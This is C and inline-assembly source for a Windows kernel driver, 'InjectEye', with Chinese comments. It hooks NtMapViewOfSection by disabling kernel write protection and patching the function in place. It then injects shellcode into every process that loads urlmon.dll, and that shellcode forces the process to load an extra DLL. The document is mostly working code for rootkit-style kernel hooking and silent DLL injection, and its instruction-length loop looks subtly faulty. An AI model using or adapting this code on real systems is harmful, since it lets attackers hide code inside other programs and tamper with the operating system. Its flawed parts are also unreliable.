/*
FileName:    InjectEye.c
Author    :    ejoyc
Data    :    [03/05/2010]~[09/22/2010]
Caution    :    1.本程序在WinXPSP3[2600.xpsp.080413-2111]、Win2003R2sp2[3790.srv03_sp2_gdr.090319-1204]和Win7Pro[ 7600.16385.x86fre.win7_rtm.090713-1255]测试通过;
2.本程序假设Urlmon.dll加载是首先执行OEP处的代码;
3.本程序涉及大量的硬编码,应该存在兼容性问题;
4.本程序参考sudami的《N种内核注入DLL的思路及实现》——这是一篇相当不错的教程
5.本程序的部分代码相当的不安全，需要加强有效性可用性的检测;
6.感谢L01(l01@withl01.net)的帮助——没有它，我无法完成InjectEye;
7.使用XDE反汇编引擎——尽管UrlMon!DllMainCRTStartup的头部那5个字节在Winxpsp3之后版本几乎是一致
*/
#include "InjectEye.h"

extern POBJECT_TYPE*    MmSectionObjectType;
static ULONG            ulHeadLen1=0;//nt!NtMapViewOfSection头部用于Hook的长度(>=5)
PZwProtectVirtualMemory    ZwProtectVirtualMemory=NULL;
PZwWriteVirtualMemory    ZwWriteVirtualMemory=NULL;
PVOID                     Kernel32LoadLibraryAAddr=NULL;
PVOID                    UrlmonDllMainCRTStartupAddr=NULL ;
UCHAR                      UrlmonDllMainCRTStartupHeadInfo[13];//Urlmon.DLL的入口函数的头部的信息(>=5)

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING RegistryPath)
{

KdPrintEx((DPFLTR_IHVDRIVER_ID,DPFLTR_ERROR_LEVEL,"[InjectEye] Entry \n"));
{
UNICODE_STRING  SystemRoutineName ;
RtlInitUnicodeString(&SystemRoutineName, L"ZwYieldExecution");
ZwWriteVirtualMemory=(PZwWriteVirtualMemory)((ULONG)MmGetSystemRoutineAddress(&SystemRoutineName )-0x14);    

RtlInitUnicodeString(&SystemRoutineName, L"ZwPulseEvent");        
ZwProtectVirtualMemory=(PZwProtectVirtualMemory)((ULONG)MmGetSystemRoutineAddress(&SystemRoutineName )-0x14);

Kernel32LoadLibraryAAddr=RetrieveFuncAddrFromKnownDLLs(L"\\KnownDLLs\\Kernel32.dll","LoadLibraryA",NULL);
UrlmonDllMainCRTStartupAddr=RetrieveFuncAddrFromKnownDLLs(L"\\KnownDLLs\\urlmon.dll",NULL,UrlmonDllMainCRTStartupHeadInfo);

KdPrintEx((DPFLTR_IHVDRIVER_ID,DPFLTR_ERROR_LEVEL,"[InjectEye] NtdllZwWriteVirtualMemory  : 0x%08X\n",(ULONG)ZwWriteVirtualMemory));
KdPrintEx((DPFLTR_IHVDRIVER_ID,DPFLTR_ERROR_LEVEL,"[InjectEye] NtdllZwProtectVirtualMemory: 0x%08X\n",(ULONG)ZwProtectVirtualMemory));
KdPrintEx((DPFLTR_IHVDRIVER_ID,DPFLTR_ERROR_LEVEL,"[InjectEye] Kernel32!LoadLibraryAAddr  : 0x%08X\n",(ULONG)Kernel32LoadLibraryAAddr));
KdPrintEx((DPFLTR_IHVDRIVER_ID,DPFLTR_ERROR_LEVEL,"[InjectEye] UrlmonDllMainCRTStartupAddr: 0x%08X\n",(ULONG)UrlmonDllMainCRTStartupAddr));
}

if (Kernel32LoadLibraryAAddr && UrlmonDllMainCRTStartupAddr && ZwProtectVirtualMemory && ZwWriteVirtualMemory && HookFunc(TRUE))
{
DriverObject->DriverUnload=InjectEyeUnload;
return STATUS_SUCCESS;
}

return STATUS_UNSUCCESSFUL;;
}

VOID InjectEyeUnload(IN PDRIVER_OBJECT DriverObject)
{
HookFunc(FALSE);
KdPrintEx((DPFLTR_IHVDRIVER_ID,DPFLTR_ERROR_LEVEL,"[InjectEye] Unloaded\n"));
}

_declspec(naked) VOID InjectDllFunc()//size>=50//DLL注射功能函数
{//这部分完全是闲得慌,没事多花力气
_asm//这部分涉及大量的硬编码，请慎重[经过测试，这份shellcode是安全的]
{
pushad                            ;60//[1]                    
push        65h;                ;6A 65        //e ///[UrlMonoEye.dll==55726C4D 6F6E4579 65 2E 646C6C]
push        79456E6Fh            ;68 6F6E4579//noEy
push        4D6C7255h            ;68 55726C4D65//UrlM
mov         eax,esp                ;8B C4     
push        eax                    ;50
mov         eax,7C801DC6h        ;B8 C6 1D 80 7C//修改offset=17处的值为Kernel32!LoadLibraryA的地址
call        eax                    ;FF D0
pop         eax                    ;58
pop         eax                    ;58
pop         eax                    ;58
popad                            ;61//[27]
nop                                ;90    // \ 
nop                                ;90    // |
nop                                ;90    // |
nop                                ;90    // |
nop                                ;90    // |
nop                                ;90    // |
nop                                ;90    // >开辟足够大的空间来容纳头部的机器码;
nop                                ;90    // |一般来说,5个字节就可以了
nop                                ;90    // |
nop                                ;90    // |
nop                                ;90    // |
nop                                ;90    // /
mov         eax,41424344h        ;B8 44 43 42 41//修改offset=40处的值为urlmon!_DllMainCRTStartup
add            eax,5;                ;83 C0 05        //[47]
jmp            eax;                ;FF E0
int            0x3                    ;cc // \//[50]
int            0x3                    ;cc // |
nop                                ;90 // >没有什么用，就是凑字数
nop                                ;90 // |
nop                                ;90 // / //[54]
}
}

_declspec(naked) NTSTATUS
GoNtMapViewOfSection(IN HANDLE SectionHandle,
IN HANDLE ProcessHandle,
IN OUT PVOID *BaseAddress,
IN ULONG ZeroBits,
IN ULONG CommitSize,
IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
IN OUT PULONG ViewSize,
IN SECTION_INHERIT InheritDisposition,
IN ULONG AllocationType,
IN ULONG Protect)
{
_asm
{
nop;//    \    
nop;//    |
nop;//    |
nop;//    |
nop;//    |
nop;//    |    
nop;//    >开辟足够大的空间来容纳头部的机器码
nop;//    |
nop;//    |
nop;//    |
nop;//    |
nop;//    /
mov        eax,NtMapViewOfSection;
add     eax,ulHeadLen1;
jmp     eax
}
}

NTSTATUS//DLL注射触发函数
DetourNtMapViewOfSection(IN HANDLE SectionHandle,
IN HANDLE ProcessHandle,
IN OUT PVOID *BaseAddress,
IN ULONG ZeroBits,
IN ULONG CommitSize,
IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
IN OUT PULONG ViewSize,
IN SECTION_INHERIT InheritDisposition,
IN ULONG AllocationType,
IN ULONG Protect)
{
NTSTATUS            NtStatus        = STATUS_UNSUCCESSFUL;
PSECTION_OBJECT        SectionObject    = NULL;
PCONTROL_AREA        ControlArea        = NULL;
PFILE_OBJECT        FileObject        = NULL;    

NtStatus=GoNtMapViewOfSection(SectionHandle,ProcessHandle,BaseAddress,ZeroBits,CommitSize,SectionOffset ,ViewSize,InheritDisposition,AllocationType,Protect);
if (NtStatus==STATUS_SUCCESS && ObReferenceObjectByHandle(SectionHandle,SECTION_MAP_EXECUTE,*MmSectionObjectType,KernelMode,&SectionObject,NULL)==STATUS_SUCCESS)
{
ControlArea=SectionObject->Segment->ControlArea;
{
ULONG FakeFileObj=(ULONG)ControlArea->FilePointer;
FakeFileObj&= ~7;//L01提供的最关键的帮助
FileObject=(PFILE_OBJECT)FakeFileObj;
}
if (FileObject!=NULL && FileObject->FileName.Buffer!=NULL)//if ((ControlArea->u&0x20)>0)
{//实现拦截应用层程序调用Urlmon.dll
//KdPrintEx((DPFLTR_IHVDRIVER_ID,DPFLTR_ERROR_LEVEL,"[InjectEye] BaseAddress:0x%08X;ViewSize:0x%08X;FileName:%wZ\n",*(PULONG)BaseAddress,ViewSize,&FileObject->FileName));
UNICODE_STRING    ModuleName;            
RtlUpcaseUnicodeString(&ModuleName,&FileObject->FileName,TRUE);
if (RtlCompareMemory(ModuleName.Buffer,URLMONPATH,URLMONPATHSIZE)==URLMONPATHSIZE)
{                
//--------------------------Core Start----------------------------------                
//思路是在加载urlmon.dll的进程中开辟64B的空间，写入shellcode InjectDllFunc
//同时改写urlmon.dll的_DllMainCRTStartup,使之实现跳转到shellcode——shellcode中有跳回到
//Dllmain之后5字节处
PUCHAR    MyDllAddress    = NULL;
SIZE_T    MyDllRegionSize    = 64;
ULONG    Offset            = 0;
PVOID     lpTemp             = UrlmonDllMainCRTStartupAddr;
ULONG    OldProtect        = 0;
if (ZwAllocateVirtualMemory(ProcessHandle,&MyDllAddress,0,&MyDllRegionSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE)==STATUS_SUCCESS)
{
KdPrintEx((DPFLTR_IHVDRIVER_ID,DPFLTR_ERROR_LEVEL,"[InjectEye] [HookPos:%08X][AllocMem:%08X] \n",lpTemp,MyDllAddress));
ZwWriteVirtualMemory(ProcessHandle,MyDllAddress,(PUCHAR)InjectDllFunc,54,NULL);
MyDllRegionSize=4096;//内存以4K分页
ZwProtectVirtualMemory(ProcessHandle,&lpTemp,&MyDllRegionSize,PAGE_EXECUTE_READWRITE,&OldProtect);
Offset=(ULONG)MyDllAddress-(ULONG)UrlmonDllMainCRTStartupAddr-5;
*(PUCHAR)UrlmonDllMainCRTStartupAddr=0xE9;//伟大的跳转指令
*(PULONG)((PUCHAR)UrlmonDllMainCRTStartupAddr+1)=Offset;//相对跳转多少字节
ZwProtectVirtualMemory(ProcessHandle,&lpTemp,&MyDllRegionSize,OldProtect,NULL);
}                
//--------------------------Core End-------------------------------------        
}
RtlFreeUnicodeString(&ModuleName);
}        
ObDereferenceObject(SectionObject);
}
return NtStatus;
}

BOOLEAN HookFunc(BOOLEAN IsHook)
{    
ULONG      CR0Value;
KIRQL      Irql;    

if (IsHook==FALSE && ulHeadLen1==0 )
{
return FALSE; 
}

Irql=KeRaiseIrqlToDpcLevel();    
_asm//关闭写保护
{
cli;
push eax;    
mov eax,cr0;
mov CR0Value,eax;
and eax,0xfffeffff;
mov cr0,eax;
pop eax;
}
if (IsHook)
{

//修改InjectDllFunc内容，完成"跳板"
*(PULONG)((PUCHAR)InjectDllFunc+17)=(ULONG)Kernel32LoadLibraryAAddr;
*(PULONG)((PUCHAR)InjectDllFunc+40)=(ULONG)UrlmonDllMainCRTStartupAddr;                
*(PUCHAR)((PUCHAR)InjectDllFunc+46)=(UCHAR)UrlmonDllMainCRTStartupHeadInfo[0];    
RtlCopyMemory((PUCHAR)InjectDllFunc+27,UrlmonDllMainCRTStartupHeadInfo+1,(SIZE_T)UrlmonDllMainCRTStartupHeadInfo[0]);

KdPrintEx((DPFLTR_IHVDRIVER_ID,DPFLTR_ERROR_LEVEL,"[InjectEye] InjectDllFunc: 0x%08X \n",InjectDllFunc));

{
struct xde_instr MyDiza;
ULONG  Offset;
PUCHAR code_pos;

//计算nt!NtMapViewOfSection头部的长度
code_pos=(PUCHAR )NtMapViewOfSection;
ulHeadLen1=0;
while (ulHeadLen1<5)
{
RtlZeroMemory(&MyDiza,sizeof(struct xde_instr));
xde_disasm(code_pos,&MyDiza);            
ulHeadLen1+=MyDiza.len;
code_pos+=ulHeadLen1;
}
RtlCopyMemory((PUCHAR)GoNtMapViewOfSection,(PUCHAR)NtMapViewOfSection,ulHeadLen1);

//修改NtMapViewOfSection内容，完成"跳板"
Offset=(ULONG)DetourNtMapViewOfSection-(ULONG)NtMapViewOfSection-5;
*(PUCHAR)NtMapViewOfSection=0xE9;
*(PULONG)((PUCHAR)NtMapViewOfSection+1)=Offset;
}
}
else
{
RtlMoveMemory((PUCHAR)NtMapViewOfSection,(PUCHAR)GoNtMapViewOfSection,ulHeadLen1);
ulHeadLen1=0;
}
_asm//重启写保护
{
push eax;
mov eax,CR0Value;
mov cr0,eax;
pop eax;
sti;
}
KeLowerIrql(Irql);
return TRUE;
}

PULONG    RetrieveFuncAddrFromKnownDLLs(IN WCHAR DllName[],IN CHAR FuncName[],IN CHAR *FuncHeadInfo)
{
PULONG FuncAddr=NULL;

do 
{//通过映射系统的KnownDLL到当前进程(system)空间，实现解析目标模块中目标函数函数的地址
NTSTATUS                Status;
HANDLE                    SectionHandle;
OBJECT_ATTRIBUTES        ObjectAttributes;
UNICODE_STRING            ObjectName;
PVOID                    ViewBase = NULL;
SIZE_T                  ViewSize = 0;

RtlInitUnicodeString(&ObjectName,DllName);
InitializeObjectAttributes(&ObjectAttributes,&ObjectName,OBJ_CASE_INSENSITIVE|OBJ_KERNEL_HANDLE,NULL,NULL);
Status=ZwOpenSection(&SectionHandle,SECTION_ALL_ACCESS,&ObjectAttributes);
if (Status!=STATUS_SUCCESS)
{
KdPrintEx((DPFLTR_IHVDRIVER_ID,DPFLTR_ERROR_LEVEL,"[InjectEye] ZwOpenSection Fail with errorcoe:%08X\n",Status));
break;
}

Status=ZwMapViewOfSection(    SectionHandle,
ZwCurrentProcess (),
(PVOID *)&ViewBase,
0L,
0L,
NULL,
&ViewSize,
ViewShare,
0L,
PAGE_EXECUTE_READWRITE);
if(Status==STATUS_SUCCESS)
{//分析当前模块的PE结构，获取相应数据
PIMAGE_DOS_HEADER        ImgDosHdr=NULL;
PIMAGE_NT_HEADERS        ImgNtHdrs=NULL;
PIMAGE_EXPORT_DIRECTORY ImgExpDir=NULL;
ImgDosHdr=(PIMAGE_DOS_HEADER)ViewBase;
ImgNtHdrs=(PIMAGE_NT_HEADERS)(ImgDosHdr->e_lfanew+(PUCHAR)ViewBase);
KdPrintEx((DPFLTR_IHVDRIVER_ID,DPFLTR_ERROR_LEVEL,"[InjectEye] BaseAddress:0x%08X;ViewSize:0x%X;%ws\n",ViewBase,ViewSize,DllName));                
if (FuncName!=NULL)
{            
ImgExpDir=(PIMAGE_EXPORT_DIRECTORY)((PUCHAR)ViewBase+ImgNtHdrs->OptionalHeader.DataDirectory[0].VirtualAddress);
//                 KdPrintEx((DPFLTR_IHVDRIVER_ID,DPFLTR_ERROR_LEVEL,"[InjectEye] Export By Name:%i\n",ImgExpDir->NumberOfNames));
//                 KdPrintEx((DPFLTR_IHVDRIVER_ID,DPFLTR_ERROR_LEVEL,"[InjectEye] ExportFunc Num:%i\n",ImgExpDir->NumberOfFunctions));
//                 KdPrintEx((DPFLTR_IHVDRIVER_ID,DPFLTR_ERROR_LEVEL,"[InjectEye] AddressOfNames:0x%08X\n",(PUCHAR)ViewBase+ImgExpDir->AddressOfNames));
//                 KdPrintEx((DPFLTR_IHVDRIVER_ID,DPFLTR_ERROR_LEVEL,"[InjectEye] AddressOfNameOrdinals:0x%08X\n",(PUCHAR)ViewBase+ImgExpDir->AddressOfNameOrdinals));
{
ULONG    ulIndex;    
ULONG    *ulFuncNameRVA=(ULONG    *)((PUCHAR)ViewBase+ImgExpDir->AddressOfNames);
ULONG    *ulFuncAddrRVA=(ULONG    *)((PUCHAR)ViewBase+ImgExpDir->AddressOfFunctions);
USHORT    *usFuncOrdiRVA=(USHORT    *)((PUCHAR)ViewBase+ImgExpDir->AddressOfNameOrdinals);
for (ulIndex=0;ulIndex<ImgExpDir->NumberOfNames ;ulIndex++)
{                            
if(_stricmp((PUCHAR)ViewBase+ulFuncNameRVA[ulIndex],FuncName)==0)
{
//KdPrintEx((DPFLTR_IHVDRIVER_ID,DPFLTR_ERROR_LEVEL,"[InjectEye] %4i  0x%08X   %s\n",ulIndex+ImgExpDir->Base,(PUCHAR)ViewBase+ulFuncAddrRVA[usFuncOrdiRVA[ulIndex]],(PUCHAR)ViewBase+ulFuncNameRVA[ulIndex]));
FuncAddr=(PULONG)((PUCHAR)ViewBase+ulFuncAddrRVA[usFuncOrdiRVA[ulIndex]]);
ulIndex=ImgExpDir->NumberOfNames;
}
}
}
}
else
{
FuncAddr=(PULONG)(ImgNtHdrs->OptionalHeader.AddressOfEntryPoint+(PUCHAR)ImgDosHdr);
}
if(FuncAddr!=NULL && FuncHeadInfo!=NULL)
{
//计算FuncName头部的长度
struct xde_instr MyDiza;
UCHAR  ulFuncHeadLen=0;
PUCHAR code_pos        =(PUCHAR )FuncAddr;            
while (ulFuncHeadLen<5)
{
RtlZeroMemory(&MyDiza,sizeof(struct xde_instr));
xde_disasm(code_pos,&MyDiza);            
ulFuncHeadLen+=(UCHAR)(MyDiza.len);
code_pos+=ulFuncHeadLen;
}
FuncHeadInfo[0]=ulFuncHeadLen;                    
RtlCopyMemory(FuncHeadInfo+1,(PUCHAR)FuncAddr,ulFuncHeadLen);
}

ZwUnmapViewOfSection (ZwCurrentProcess (), ViewBase);//必须卸载映像
}
else
{
KdPrintEx((DPFLTR_IHVDRIVER_ID,DPFLTR_ERROR_LEVEL,"[InjectEye] ZwMapViewOfSection Fail with errorcoe:0x%08X\n",Status));
}
ZwClose(SectionHandle);//关闭全面Open的Section
} while (FALSE);    

return FuncAddr;
}